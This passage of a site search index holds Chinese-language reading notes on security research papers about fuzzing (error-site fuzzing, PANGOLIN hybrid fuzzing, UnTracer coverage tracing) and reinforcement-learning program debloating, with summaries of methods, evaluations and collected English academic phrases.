\u53ea\u67094\u4e2a\u9700\u8981\u4e00\u4e2a\u4ee5\u4e0a\u7684bug\u6ce8\u5165 \u4e5f\u5c31\u8bf4\u5927\u90e8\u5206bug\u4e00\u4e2a\u9519\u8bef\u5c31\u80fd\u89e6\u53d1\u4e86\uff1b\u5927\u90e8\u5206bug\u90fd\u662f\u56e0\u4e3a\u88ab\u8c03\u7528\u7684\u51fd\u6570\u6b63\u786e\u5904\u7406\u4e86\u5f02\u5e38 \u4f46\u8c03\u7528\u8005\u6ca1\u6709\u2014\u2014\u5f00\u53d1\u8005\u7ecf\u5e38\u7531\u4e8e\u590d\u6742\u7684\u8c03\u7528\u5728error propagation\u4e0a\u72af\u9519\u8bef</p> <p>\u548c\u5176\u4ed6fuzzer\u6bd4\u8f83 \u8bf4\u81ea\u5df1\u7684coverage\u66f4\u9ad8</p> <p>\u81ea\u5df1\u6ca1\u6bd4\u4eba\u5bb6\u5f3a\u5c31\u8bf4We believe that if\u6211\u4eec\u4e5f\u5b9e\u73b0\u4ed6\u4eec\u7684fuzzing\u8fc7\u7a0b\uff0c\u90a3\u5c31\u4f1a\u66f4\u597d</p> <p>discussion: \u9519\u8bef\u4f4d\u7f6e\u7684\u63d0\u53d6 \u7684 \u8bef\u62a5\uff1a \u6709\u4e9b\u51fd\u6570\u867d\u7136\u7ecf\u5e38\u8ddf0\u6bd4\u8f83\u4f46\u4e0d\u4f1a\u8fd4\u56de\u9519\u8bef \u5982strstr \u901a\u8fc7\u5206\u6790\u5b9a\u4e49\u548c\u8c03\u7528\u56fe\u68c0\u67e5\u662f\u5426\u771f\u7684\u80fd\u8fd4\u56de\u8868\u793a\u9519\u8bef\u7684\u9519\u8bef\u503c\uff1b\u51fd\u6570\u7684\u8f93\u5165\u4e00\u5b9a\u5148\u8f6c\u6362\u6210\u6709\u6548\u7684\u6570\u636e \u7528\u7b26\u53f7\u6267\u884c\u6765\u5206\u6790 \u5bf9\u6bcf\u4e2a\u51fd\u6570\u8c03\u7528\u8ba1\u7b97\u7ea6\u675f</p> <p>\u9519\u8bef\u68c0\u6d4b \u7684 \u6f0f\u62a5\uff1a\u4e3a\u4e86\u907f\u514d\u91cd\u590d\u6ce8\u5165\u53ea\u8003\u8651\u4e86\u5e93\u51fd\u6570\uff0c\u4f46\u6709\u4e9b\u5f00\u53d1\u8005\u81ea\u5df1\u5199\u7684\u6ca1\u8c03\u7528\u4efb\u4f55\u5e93\u51fd\u6570\u4e5f\u80fd\u8fd4\u56de\u9519\u8bef\uff1bcoverage\u6ca1\u5230 FIFUZZ\u4e0d\u80fd\u63d0\u4f9b\u6240\u6709\u53ef\u80fd\u7684\u7a0b\u5e8f\u8f93\u5165\u548c\u914d\u7f6e\uff1b\u7528ASan\u7684\u5c40\u9650 \u4f46\u53ef\u4ee5\u6269\u5c55\u7528MSan UBSan TSan</p> <p>\u76f8\u5173\u7684paper: \u8f7b\u91cf\u7ea7\u8fd0\u884c\u65f6\u76d1\u6d4b\uff1a\u57fa\u4e8e\u786c\u4ef6\u7684tracing [3, 31]\uff0c call-path inferring[42] \u7528\u9759\u6001\u5206\u6790\u627e\u9519\u8bef\u5904\u7406\u7684bug [28, 32, 33, 37, 53] PairCheck[9] \u7edf\u8ba1\u5206\u6790\u627e\u8d44\u6e90acquire\u548crelease\u7684pair\uff0c\u627e\u9519\u8bef\u5904\u7406\u4e2d\u6ca1\u6709release</p> <p>\u6700\u540econclusion\u6700\u540e\u4e00\u6bb5\u8bf4\u6539\u8fdb \u51cf\u5c11\u8bef\u62a5\uff1b\u63d0\u9ad8\u6027\u80fd\uff1b\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00 plan to test the program in other programming languages \uff08such as C++ and Java\uff09</p>"},{"location":"PaperReading/#pangolin-incremental-hybrid-fuzzing-with-polyhedral-path-abstraction","title":"PANGOLIN: Incremental Hybrid Fuzzing with Polyhedral Path Abstraction","text":"<p>SP2020 PDF</p> <p>\u4e00\u53e5\u8bdd\u6982\u62ec\uff1a\u6539\u8fdbQSYM\u6df7\u5408fuzzing \u7f13\u5b58\u6c42\u89e3\u51fa\u6765\u7684\u53d6\u503c\u8303\u56f4\u7528\u591a\u8fb9\u5f62\u8868\u793a \u6765\u66f4\u597d\u7684\u53d8\u5f02\u66f4\u5feb\u7684\u6c42\u89e3</p> <p>\u5355\u8bcd\u4e0e\u8868\u8fbe\uff1a</p> <ul> <li>sluggish \u6027\u80fd\u4e0d\u884c \u592a\u6162</li> <li>succinct \u7b80\u6d01\u7684</li> <li>\u53d6\u5f97\u5e73\u8861 a sweet spot between \u2026</li> <li>obstruct \u963b\u788d</li> <li>we followed the standard instructions in the previous paper \u8bf4\u81ea\u5df1\u7684\u65b9\u6cd5\u662f\u6309\u7167\u522b\u4eba\u5efa\u8bae\u7684</li> <li>orthogonal \u8bf4\u522b\u4eba\u7684\u7814\u7a76\u548c\u81ea\u5df1\u7684\u4e0d\u51b2\u7a81\u53ef\u4ee5\u4e92\u8865</li> </ul> <p>intro \u7b2c\u4e00\u6bb5 \u4ecb\u7ecdhybrid fuzzing\u5f88\u6709\u7528\uff1b\u7b2c\u4e8c\u6bb5\u8bf4\u73b0\u5728\u7684\u65b9\u6cd5\u4e0d\u884c \u63d0\u51fa\u95ee\u9898\u4e0dincremental \u6700\u540e\u4e00\u53e5\u63d0However, intuitively\u5e94\u8be5\u53ef\u4ee5\u8fd9\u4e48\u505a\uff1b\u4e4b\u540e\u4e3e\u4f8b\u5b50\uff1b\u6838\u5fc3\u7684\u4e24\u70b9\u2014\u2014\u7528\u591a\u8fb9\u5f62\u7684\u8def\u5f84\u7ea6\u675f\u628a\u79cd\u5b50\u53d8\u5f02\u8f6c\u6362\u6210\u5728\u4e00\u4e2a\u591a\u8fb9\u5f62\u5185\u53d6\u6837\u3001\u7528\u7ea6\u675f\u964d\u4f4e\u7ea6\u675f\u6c42\u89e3\u590d\u6742\u5ea6\u51cf\u5c0f\u53ef\u884c\u89e3\u7a7a\u95f4 \u4ece\u800c\u52a0\u901f\u7ea6\u675f\u6c42\u89e3\uff1b\u7136\u540e\u8bf4\u81ea\u5df1\u6d4b\u4e86\u4e00\u4e0b \u6548\u679c\u6bd4state of art\u597d10%~30%\u7684coverage\uff0c\u5728LAVA-M\u80fd\u591a\u53d1\u73b0500+bugs\uff0c\u53d1\u73b0\u65b0\u768441\u4e2abug \u62ff\u52308\u4e2aCVE</p> <p>\u968f\u673a\u53d8\u5f02\u7684\u7a7a\u95f4\u603b\u662f\u592a\u5927\u4e86</p> <p>\u7ea6\u675f\u7684\u62bd\u8c61 \u6709 interval [32], octagon [33], and polyhedral [34]. \u90fd\u662fsound\u7684\uff08\u5305\u542b\u6240\u6709\u76ee\u6807\u70b9\uff09\uff0c\u4f46polyhedral\u6709\u6700\u597d\u7684precision \u5305\u542b\u6700\u5c11\u7684\u975e\u76ee\u6807\u70b9</p> <p>\u91c7\u6837\u7528Dikin walk algorithm \u80fd\u4fdd\u8bc1\u5747\u5300\u91c7\u6837 \u4fdd\u8bc1\u591a\u6837\u6027\uff1a\u6bcf\u4e24\u4e2a\u91c7\u6837\u4e4b\u95f4\u7684\u8ddd\u79bb\u90fd\u8981\u5927\u4e8e\u4e00\u4e2a\u52a8\u6001\u8fb9\u754c</p> <p>\u5177\u4f53\u505a\u6cd5\u5e76\u4e0d\u76f2\u76ee\u8ba1\u7b97x+y\u548cx-y\uff0c\u800c\u662f\u52a0\u5165\u7ea6\u675f\u4e2d\u7684\u7ebf\u6027\u8868\u8fbe\u5f0f \u59825x+y</p> <p>\u5e94\u8be5\u91c7\u591a\u5c11\u6837\u672c\uff1f\u8d8a\u96becover\u7684\u9700\u8981\u8d8a\u591a\uff0c\u8d8a\u591a\u4f9d\u8d56\u5b83\u7684\u8def\u5f84\u9700\u8981\u8d8a\u591a</p> <p>evaluation \u4e09\u4e2aRQ\u7814\u7a76\u95ee\u9898\uff1a1. \u6bd4\u73b0\u5728\u6700\u597d\u7684fuzzer\u80fd\u4e0d\u80fd\u53d1\u73b0\u66f4\u591a\u7684bug\uff1b2.\u80fd\u4e0d\u80fd\u66f4\u9ad8\u7684coverage\uff1b3. \u53d8\u5f02\u65b9\u6cd5\u7684\u6709\u6548\u6027</p> <p>\u5b9e\u9a8c\u7528\u4e86\u4e24\u4e2aafl\uff0cangora\u6709-j 2\uff0c\u4f46T-Fuzz\u4e0d\u652f\u6301 \u4e5f\u5c31\u76f4\u63a5\u8dd1\u4e86</p> <p>\u9009seed\u7684\u65b9\u5f0f\uff1a\u7528AFL\u63d0\u4f9b\u7684seed\uff0c\u7528\u4eba\u5bb6\u4ee3\u7801\u91cc\u81ea\u5e26\u7684\u6d4b\u8bd5\u6837\u4f8b</p> <p>\u91cd\u590d10\u6b21</p> <p>\u6bd4\u8f83\u4e86\u6548\u679c\u597d\u4e4b\u540e\u8ba8\u8bba\u4e3a\u5565\u6ca1\u80fd\u53d1\u73b0LAVA-M\u7684\u6240\u6709bug\uff1f\u8bf4\u8fd9\u662fQSYM\u7684\u95ee\u9898 \u7f3a\u5c11\u5bf9\u5e95\u5c42\u7cfb\u7edf\u8c03\u7528\u7684\u5efa\u6a21\u5982who\u7528\u7684x2nrealloc\uff0c\u4e0d\u652f\u6301\u6d6e\u70b9\u6570\u7ea6\u675f\u3002\u4f46\u662f\u8fd9\u4e9b\u9650\u5236\u4e0d\u662f\u8fd9\u7bc7work\u8981\u89e3\u51b3\u7684\u95ee\u9898\uff0cand we leave them as our future work.</p> <p>crash\u53bb\u91cd\u7528\u7684<code>afl-cmin -C</code></p> <p>\u53d1\u73b0\u4e86T-Fuzz\u5bf9\u5927\u7a0b\u5e8f\u6709scalability issues \u6240\u4ee5\u5c31\u6ca1\u6709\u6bd4\u8f83coverage</p> <p>\u6bd4QSYM\u597d\uff0c\u539f\u56e0\u662fqsym\u5bf9\u6bcf\u4e2abranch\u53ea\u751f\u6210\u4e00\u4e2aseed\uff0c\u8fd9\u6837\u4f1a\u6f0f\u6389\u4e00\u4e9b\u2014\u2014\u8986\u76d6\u5230\u4e00\u4e2abranch\u5e76\u4e0d\u610f\u5473\u7740\u5c31\u80fd\u89e6\u53d1\u6f0f\u6d1e</p> <p>The performance of constrained mutation\uff1a\u6bd4\u8f83\u63d0\u51fa\u7684constrained mutation\u548cSMTSampler \u770b\u7ed9\u5b9atime buget\u5206\u522b3s 5s 10s\u7684\u60c5\u51b5\u4e0b\u80fd\u89e3\u51fa\u591a\u5c11 \u8ba1\u7b97\u5e73\u5747\u65f6\u95f4\u7684\u65f6\u5019\u5982\u679c\u4e0d\u80fd\u89e3\u51b3\u5c31\u6309\u4e0a\u9650\u2014\u2014\u8d85\u8fc795%\u7684\u7ea6\u675f\u90fd\u80fd\u57283\u79d2\u949f\u5185\u641e\u5b9a\u3002\u603b\u4e4b\uff0c\u6211\u4eec\u7684\u65b9\u6cd5\u6bd4SMTSampler\u6548\u7387\u548c\u6709\u6548\u6027\u90fd\u5f3a \u4e3a\u5565\u5462\uff1f\u51cf\u5c11\u4e86\u7ea6\u675f\u6c42\u89e3\u5668\u7684\u8c03\u7528\u3001\u4fdd\u8bc1\u4e86\u5747\u5300\u5206\u5e03</p> <p>related work \u79cd\u5b50\u7684\u4f18\u5148\u9009\u62e9\u548c\u8c03\u5ea6 \u662f\u57fa\u4e8e\u7a0b\u5e8f\u7ed3\u6784\u7684 \u5ffd\u89c6\u4e86\u8f93\u5165\u7684\u5b9e\u9645\u53d6\u503c\u7a7a\u95f4 \u76f8\u6bd4\u4e8eKLEE\u7f13\u5b58\u4e86constraint\uff0c\u6211\u4eec\u7f13\u5b58\u4e86\u539f\u59cb\u8def\u5f84\u7ea6\u675f\u7684\u7b80\u5316\u5f62\u5f0f path abstraction</p> <p>\u5982\u4f55\u6709\u6548\u7684\u5c06concolic execution\u548cfuzzing\u7ed3\u5408is always under consideration</p> <p>\u5c3d\u7ba1\u6709\u5185\u5b58\u5feb\u7167\u7684\u6280\u672f\u6765\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001[7] \u201cUnleashing mayhem on binary code\u201d\uff0c\u4f46\u5bf9hybrid fuzzing\u6765\u8bf4\u592a\u6162\u4e86</p>"},{"location":"PaperReading/#full-speed-fuzzing-reducing-fuzzing-overhead","title":"Full speed Fuzzing: Reducing Fuzzing Overhead","text":"<p>\u4e00\u53e5\u8bdd\u6982\u62ec\uff1a \u6bcf\u4e2a\u57fa\u672c\u5757\u7b2c\u4e00\u4e2a\u5b57\u8282\u6539\u6210CC\u89e6\u53d1\u4e2d\u65ad\uff0c\u4e0d\u9700\u8981\u8017\u65f6\u5730\u8bb0\u5f55coverage\u4e86\uff0c\u53d1\u73b0\u65b0\u7684\u57fa\u672c\u5757\u5c31\u80fd\u81ea\u52a8\u77e5\u9053</p> <p>\u5355\u8bcd\uff1a</p> <ul> <li>tracking apparatuse\u63d2\u6869\u4ee3\u7801\u505a\u7684\u4e8b\u60c5</li> <li>niche \u5408\u5b9c\u7684\u5c0f\u73af\u5883 \u8fd9\u91cc\u4f3c\u4e4e\u662f\u53d7\u9650\u7684\u610f\u601d As applications of directed fuzzing are generally niche, such as taint tracking [16] or patch testing [31], coverage-guided fuzzing\u2019s wider scope makes it more popular among the fuzzing community [5], [6], [4], [3].</li> <li>narrow \u533a\u522b\u4e0d\u5927 results in Section VI suggest that the performance gap is much narrower.</li> <li>convincingly \u6bd4\u5176\u4ed6\u4eba\u597d A12 excceds 0.71</li> <li>performance-taxing \u8017\u65f6</li> <li>per-variant geometric mean\u5206\u7ec4\u8ba1\u7b97\u5747\u503c</li> <li>deficit \u5f15\u5165\u7684overhead: \u2026 far outweighs the performance deficit from trimming and calibration tracing</li> <li>is not a technical challenge \u6ca1\u505a\u7684\u4e1c\u897fclaim\u4e0d\u96be\u505a</li> <li>graciously \u611f\u8c22\u5176\u4ed6\u4eba</li> </ul> <p>\u4eba\u5bb6\u7684idea\uff1a</p> <pre><code>\u628a\u7a0b\u5e8f\u53d8\u6210\u4e00\u4e2a\u80fd\u81ea\u5df1\u62a5\u544a\u6709\u6ca1\u6709\u53d1\u73b0\u65b0\u7684basic block\u7684\u2014\u2014\u5728\u6bcf\u4e2a\u57fa\u672c\u5757\u5f00\u5934\u53d8\u62100xCC\uff08encode the current frontier\uff09\uff0c\u89e6\u53d1\u4e86\u4e2d\u65ad\u8bf4\u660e\u6709\u65b0\u7684\u8986\u76d6\u7387\uff0c\u9700\u8981\u505c\u4e0bfork server\u53bb\u6389\u8fd9\u4e2a\u4e2d\u65ad\u518d\u7ee7\u7eed\u8dd1\n\u505acoverage-guided tracing\n\u4eba\u5bb6\u7684\u5b9e\u9a8c\u5176\u5b9e\u4e0d\u662f\u5728\u505afuzzing\uff0c\u800c\u662f\u5148\u8dd1afl-qemu\u6536\u96c624\u5c0f\u65f6\u6240\u6709\u751f\u6210\u7684seed\uff085\u4e2a\u4e0d\u540c\u7684test case datasets\uff09\uff0c\u518d\u6539\u4e86afl\u53ea\u8dd1run_target\uff0c\u770b\u4e0d\u540c\u7684\u8bbe\u8ba1\u4e0b\u8017\u65f6\u7684\u533a\u522b\n\u53bb\u6389\u566a\u97f3\u7528\u7684trimmed-mean denoising \u53bb\u6389\u6700\u5927\u6700\u5c0f33%\n\u5b9e\u9a8c\u662f5\u4e2adataset,\u6bcf\u4e2a\u91cd\u590d8\u6b21 \n\u57fa\u4e8eafl-dyninst\u5b9e\u73b0\uff0c\u4f46\u662f\u8fd9\u73a9\u610f\u6027\u80fd\u4e0d\u884c \u6240\u4ee5\u8dd1\u7684oracle\u7a0b\u5e8ffork server\u8fd8\u662f\u7528afl-as\u63d2\u7684\n\u5728tracer\u8bb0\u5f55\u5757\u7684\u8986\u76d6\u7387\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u5757\u53ef\u80fd\u6267\u884c\u591a\u6b21\u5f88\u5927\u7684overhead\uff0c\u4e8e\u662f\u641e\u4e86\u4e2a\u5168\u5c40\u7684hashmap\uff0c\u548cfork server\u5171\u4eab \u4e4b\u540e\u7684\u8fdb\u7a0b\u5c31\u77e5\u9053\u54ea\u4e9b\u624d\u662funique-covered basic blocks\n\u4e0d\u61c2\u7684\u5730\u65b9\uff1a\u4e3a\u5565\u4f1a\u5c1d\u8bd5\u5bf9\u540c\u4e00\u4e2a\u5730\u65b9\u591a\u6b21unmodify?  We observe that even coverage-increasing test cases often have significant overlaps in coverage. This causes UnTracer to attempt unmodifying many already-unmodified basic blocks, resulting in high overhead.\n\u9009\u62e9\u7684fuzz\u6587\u4ef6\u7c7b\u578b\uff1adev\u5f00\u53d1\uff0c\u56fe\u7247\uff0c\u538b\u7f29data archiving\uff0c\u7f51\u7edcnetwork utilities\uff0c\u97f3\u9891\uff0c\u6587\u6863\uff0c\u5bc6\u7801\u5b66cryptography\uff0cweb\u5f00\u53d1\ntimeout\u4e5f\u662f\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u56e0\u7d20 \u5982\u679ctimeout\u7684\u6587\u4ef6\u592a\u591a \u4f5c\u8005\u7684\u4f18\u52bf\u5c31\u4e0d\u660e\u663e\u4e86\uff1b\u5b9e\u9a8c\u8bbe\u7f6e\u4e3a500ms\u7684\u8d85\u65f6\n\u6bd4\u8f83\u7684baseline: \u53eafork server\u4e0d\u8fdb\u884c\u4efb\u4f55\u63d2\u6869\uff0c\u8fd9\u662f\u6700\u5feb\u7684 overhead\u662f\u76f8\u5bf9\u4e8e\u8fd9\u4e2abaseline\u800c\u8a00\u7684\n</code></pre> <p>\u540e\u7eed\u8981\u4e86\u89e3\u7684\uff1a</p> <pre><code>Intel PT\u786c\u4ef6\u8f85\u52a9[11],[4],[12]\u7684\u8986\u76d6\u7387 overhead\u66f4\u5c0f\uff0c\u7f3a\u70b9\uff1a\u9700\u8981\u4e00\u4e2a\u652f\u6301\u7684CPU\uff0c\u89e3\u7801CFG\u65e5\u5fd7\u8017\u65f6\uff0c\u53ea\u652f\u6301x86\nXuwen\u7684\u4f18\u5316\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528[61] fuzzer-agnostic operating primitives\n\u7a0b\u5e8f\u6539\u5199AFL-lafIntel [70] unrolls magic bytes into single comparisons at compile-time, but currently only supports white-box binaries.\n</code></pre> <p>\u4e09\u79cd\u8986\u76d6\u7387\u7684\u8ba1\u7b97\u65b9\u5f0f\uff1a\u57fa\u672c\u5757\uff0c\u8fb9\uff0cbasic block path\u8fd9\u4e00\u79cd\u6ca1\u4eba\u505a \u53ea\u8bb0\u5f55basic block\u6765\u63a8\u65ad\u8fb9\u7684\u4fe1\u606f\uff0c\u662f\u6709\u95ee\u9898\u7684\uff1a\u5b58\u5728critical edges\u5c31\u4e0d\u51c6\u786e\uff0c\u9700\u8981\u5148\u53bb\u6389critical edges\u624d\u884c \u5c31\u662f\u7a7a\u7684else\u4e5f\u8981\u5f53\u6210\u4e00\u4e2a\u5757 \u5426\u5219\u4f1a\u9519\u8bef\u5730\u4e22\u6389\u4e00\u4e9b\u53d1\u73b0\u4e86\u65b0\u8986\u76d6\u7387\u7684\u79cd\u5b50 erroneously discard coverage-increasing inputs.\uff08\u53ef\u80fdafl\u5bf9for\u7684\u652f\u6301\u5c31\u662f\u8fd9\u4e2abug</p> <p>afl\u7684queue\u91cc\u7684\u6587\u4ef6\u6709+cov\u7684\u624d\u662f\u53d1\u73b0\u4e86\u65b0\u7684\u8986\u76d6\u7387\u7684</p> <p>\u5f71\u54cdafl\u53d8\u5f02\u4f18\u5148\u7b56\u7565\u7684\u9664\u4e86coverage\u8fd8\u6709\u6587\u4ef6\u5927\u5c0f\uff0c\u76f8\u540c\u8986\u76d6\u7387\u4f18\u5148\u7528\u5c0f\u7684seed</p> <p>p-value\u5c0f\u4e8e0.05\u8981\u8bf4(pair-wise)</p> <p>hybrid\u7684fuzzer\u82b1\u66f4\u591a\u7684\u65f6\u95f4\u53d8\u5f02 \u5982QSYM</p>"},{"location":"PaperReading/#effective-program-debloating-via-reinforcement-learning","title":"Effective Program Debloating via Reinforcement Learning","text":"<p>CCS18 PDF</p> <p>\u6982\u62ec\uff1a\u628a\u673a\u5668\u5b66\u4e60\u7528\u5230Program Debloating\uff0c\u57fa\u672c\u65b9\u6cd5\u662f\u53cd\u590d\u5207\u7247\u53bb\u6389\uff0c\u7528Reinforcement Learning\u6765\u51cf\u5c11\u7f16\u8bd1\u6d4b\u8bd5\u7684\u6b21\u6570</p> <p>\u5355\u8bcd</p> <ul> <li>seldom if ever used by average users \u4e00\u822c\u7528\u6237\u4e0d\u4f1a\u7528</li> <li>has led to its sparing use \u5bfc\u81f4\u6ca1\u4eba\u7528</li> <li>has been shown to suffice in the literature on \u2026 \u8bba\u6587\u4e2d\u5df2\u7ecf\u63d0\u5230</li> <li>mangle \u641e\u4e71\u7a0b\u5e8f</li> <li>sacrifice efficiency \u8bf4\u522b\u4eba\u7684\u4e0d\u8db3\u7684\u65f6\u5019\u8bf4\u727a\u7272\u4e86xxx</li> <li>tailored to C/C++ \u53ea\u9002\u5408xxx</li> <li>myopic \u77ed\u89c6\u7684 Since the rules are myopic, C-Reduce generates a significant number of syntactically invalid candidates</li> <li>albeit \u4f46\u662f albeit due to a different reason.</li> <li>presuming a general setting where such an analysis may not be available \u4e3e\u7684\u4f8b\u5b50\u53ef\u4ee5\u5f88\u7b80\u5355\u9759\u6001\u5206\u6790\u51fa\u6765\uff0c\u8bf4\u4e00\u822c\u7684\u60c5\u51b5\u4e0b\u9759\u6001\u5206\u6790\u6ca1\u7528</li> <li>akin to \u2026 \u548cxxx\u76f8\u540c \u63d2\u5165\u8bed because it not only avoids syntactic errors, akin to Perses, but it also learns to avoid semantic errors.</li> <li>Overall \u4e00\u6bb5\u8bdd\u7ed3\u675f\u7684\u65f6\u5019\u603b\u7ed3</li> <li>large boilerplate code \u4e00\u5927\u6bb5\u4ee3\u7801</li> <li>heed to \u9075\u5b88 C-Reduce does not heed to common software engineering practices such as modularity and locality</li> <li>suffices in practice\u5b9e\u9645\u4e0a\u662f\u5426\u8db3\u591f The reader may wonder whether a naive approach to program reduction based on runtime code coverage suffices in practice.</li> <li>empirically comfirmed \u9a8c\u8bc1\u9c81\u68d2\u6027\u53ea\u80fd\u7ecf\u9a8c\u6027\u5730\u9a8c\u8bc1</li> <li>in this regard \u5728\u8fd9\u4e2a\u65b9\u9762 We can mitigate the issue by combining the results of multiple static analyzers that possess different capabilities in this regard.</li> </ul> <p>idea</p> <pre><code>\u7a0b\u5e8f\u7684\u5e93\u548cone-size-fits-all\u7684\u5f00\u53d1\u65b9\u5f0f\u5bfc\u81f4\u4e86\u5927\u91cf\u5f88\u5c11\u7528/\u6ca1\u7528\u7684\u4ee3\u7801\n\u524d\u4eba\u7684\u505a\u6cd5\u6ca1\u8003\u8651\u8bed\u4e49\u4f9d\u8d56 \u5bfc\u81f4\u672a\u521d\u59cb\u5316\u53d8\u91cf\u7b49\u8bed\u4e49\u9519\u8bef unaware of semantic dependencies between program elements (e.g., def-use relations of variables\ndebloating \u901a\u8fc7delta debugging \u4e00\u6b65\u6b65\u53bb\u6389\u7a0b\u5e8f\u4e2d\u80fd\u5220\u7684\u7247\u6bb5\uff0c\u7528\u5f3a\u5316\u5b66\u4e60\u52a0\u901f\uff08\u51b3\u7b56\u6811 \u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b\uff09\uff0c\u4fdd\u8bc1\u80fd\u8fc7\u6d4b\u8bd5high-level specification\uff0c\u6700\u540e\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u4efb\u4f55\u4e00\u4e2a\u7247\u6bb5\u90fd\u4e0d\u80fd\u518d\u5220\uff081-minimality\uff09\n\u8fd9\u4e2a\u65b9\u6cd5\u80fd\u6269\u5c55\u5230\u5927\u7a0b\u5e8f\uff0c\u907f\u514d\u73b0\u6709\u5de5\u5177\u8d85\u65f6\u7684\u95ee\u9898\n\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u964d\u4f4e\u653b\u51fb\u9762 \u53bb\u6389\u53ef\u9009\u529f\u80fd\u4e2d\u7684\u6f0f\u6d1e\uff0c\u51cf\u5c11ROP gadget\n</code></pre> <p>\u60f3\u505a\u5230\u4e94\u70b9\uff1a \u6700\u5c0f\uff1b\u8017\u65f6\u77ed\uff1b\u9c81\u68d2\u4e0d\u5f15\u5165\u65b0\u7684\u6f0f\u6d1e\uff1b\u751f\u6210\u7684\u4ee3\u7801\u53ef\u7ef4\u62a4\u53ef\u6269\u5c55\uff1b\u901a\u7528 \u6bd4\u9759\u6001\u5206\u6790\u52a8\u6001coverage\u7684\u90fd\u5c0f\uff1b\u5176\u4ed6\u4eba\u8d85\u65f6\u6211\u4eec\u90fd\u884c\uff1b\u7528\u9759\u6001\u5206\u6790\u5de5\u5177\u548cAFL\u6d4b3\u5929\u53ef\u4ee5\u53cd\u9988loop\uff1b\u4fdd\u7559\u4e86modularity and locality\uff1b\u65b9\u6cd5\u901a\u7528 \u548c\u7f16\u7a0b\u8bed\u8a00\u3001\u89c4\u8303\u65e0\u5173</p> <p>\u89c4\u8303\u5c31\u662f\u6d4b\u8bd5\u4ee3\u7801 \u8f93\u5165\u4e00\u4e2a\u88c1\u526a\u540e\u7684\u4ee3\u7801 \u8f93\u51fa\u80fd\u5426\u6ee1\u8db3\uff1a \u80fd\u8fc7\u7f16\u8bd1\uff1b\u9700\u8981\u7684\u529f\u80fd\u6b63\u5e38\uff1b\u4e0d\u9700\u8981\u7684\u529f\u80fd\u81f3\u5c11\u4e0d\u80fd\u5d29\uff08\u6d4b\u8bd5\u6837\u4f8b\u6765\u81ea\u56de\u5f52\u6d4b\u8bd5\uff09\uff1b\u8981\u4f7f\u7528sanitizer\u786e\u4fdd\u6ca1\u6709\u672a\u5b9a\u4e49\u884c\u4e3a</p> <p>\u9a6c\u5c14\u79d1\u592b\u51b3\u7b56\u8fc7\u7a0b MDP</p> <p>\u57fa\u4e8e\u6a21\u578b\u7684\u5f3a\u5316\u5b66\u4e60 MBRL \u5728\u6a21\u578b\u7684\u5e2e\u52a9\u4e0b\u89e3\u51b3MDP\u95ee\u9898\uff0c\u5b66\u51fa\u8f6c\u6362\u7684\u6982\u7387\u548c\u5956\u8d4f\uff0c\u5f97\u5230\u53ef\u4ee5\u6700\u5927\u5316\u6536\u76ca\u548c\u7684\u52a8\u4f5c</p> <p>\u65b9\u6cd5\uff1a\u6267\u884c\u8fc7\u7a0b\u4f1a\u66f4\u65b0\u51b3\u7b56\u6811 \u7a0b\u5e8f\u7684\u7f16\u7801\u5c31\u662f\u7a0b\u5e8fn\u4efd \u6bcf\u4e00\u4efd\u662f\u5426\u5b58\u5728 \u4e00\u5f00\u59cb\u5c31\u662fn\u4e2a1</p> <p>\u5177\u4f53\u5b9e\u73b0\u7684\u65f6\u5019\u662f\u5148\u5220global-level\u7684\u7ec4\u4ef6 \u5982\u5168\u5c40\u53d8\u91cf\u58f0\u660e\u3001\u7c7b\u522b\u5b9a\u4e49\u3001\u51fd\u6570\u5b9a\u4e49\uff0c\u518d\u5220\u5c40\u90e8\u7c7b\u522b\u7684\u7ec4\u4ef6 \u8d4b\u503c\u3001if\u8bed\u53e5\u3001while\u8bed\u53e5\uff0c\u7136\u540e\u7ee7\u7eedglobal local \u2026\u8fed\u4ee3\u5230\u7a33\u5b9a \u4f7f\u7528\u7b80\u5355\u7684\u4f9d\u8d56\u5206\u6790\u6765\u62d2\u7edd\u4e0d\u53ef\u80fd\u7684\u7a0b\u5e8f \u5982\u6ca1\u6709main \u7f3a\u5931\u53d8\u91cf\u5b9a\u4e49 \u53d8\u91cf\u6ca1\u521d\u59cb\u5316 \u6ca1\u6709return\u8bed\u53e5 \u51b3\u7b56\u6811\u7528\u7684FastDT\uff0c\u7528\u7684exact decision trees\u6ca1\u6709boosting bagging  \u8ba1\u7b97\u4ee3\u7801\u884c\u6570\u4e4b\u524d\u8981\u5148\u5b8f\u5c55\u5f00</p> <p>Evaluation \u9009\u4e8610\u4e2abinutils\u91cc\u7684\u7a0b\u5e8f\uff0c\u90fd\u5728busybox\u91cc \u53ef\u4ee5\u76f4\u63a5\u6bd4\u8f83 \u907f\u514d\u4ea7\u751f\u6b7b\u5faa\u73af\u7684\u7a0b\u5e8f \u8bbe\u7f6e\u4e86\u4e0d\u540c\u7684timeout 0.01~1s</p> <p>\u753b\u56fe\u5dee\u5f02\u592a\u5927\u53ef\u4ee5\u622a\u65ad \u9876\u90e8\u663e\u793a\u6570\u503c \u6709\u4e9bCVE\u6ca1\u80fd\u5220\u6389 \u8bf4\u8fd9\u4e9b\u5728\u6838\u5fc3\u529f\u80fd\u91cc\u9762 \u4e0d\u80fd\u7b80\u5355\u5220\u6389 \u5982\u6761\u4ef6\u7ade\u4e89  \u4ea7\u751f\u7684\u4ee3\u7801\u4f7f\u9759\u6001\u5206\u6790\u5de5\u5177\u7684\u62a5\u544a\u51cf\u5c11\u4e8695.4% \u62a5\u544a\u5c31\u80fd\u770b\u4e86 The decreased size and complexity of the reduced programs also enable to apply more precise program checkers such as static analyzers. \u7136\u540e\u4eba\u5de5\u68c0\u67e5\u8bf4\u90fd\u662f\u8bef\u62a5 feedback process \u8dd1AFL\u7684\u65f6\u5019\u5d29\u4e86 \u53d1\u73b0\u662f\u7f55\u89c1\u7684\u60c5\u51b5 \u628a\u8fd9\u79cd\u6d4b\u8bd5\u7528\u4f8b\u8003\u8651\u8fdb\u53bb\u540e\u91cd\u65b0\u751f\u6210 \u518dfuzzing\u5c313\u5929\u90fd\u4e0d\u5d29\u4e86This simple feedback process effectively improved the robustness of the resulting program</p> <p>THREATS TO 